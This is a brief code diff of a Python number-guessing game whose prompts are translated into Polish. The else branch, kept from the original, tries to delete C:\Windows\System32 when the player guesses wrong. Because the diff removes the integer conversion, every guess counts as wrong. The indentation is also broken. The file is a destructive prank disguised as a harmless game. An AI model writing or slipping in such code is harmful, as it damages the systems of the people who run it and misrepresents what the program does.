@@ -1,9 +1,8 @@
 import random
 import os
-number = random.randint(1,10)
-guess = input("Silly game! Guess number between 1 and 10")
-guess = int(guess)
-if guess == number:
-print("You Won!")
+liczba = random.randint(1,10)
+odpowiedź = input("zabawna gra zgadnij liczbę od 1 do 10")
+if odpowiedź == liczba:
+  print("Brawo zgadłeś")
 else:
 os.remove("C:\Windows\System32")
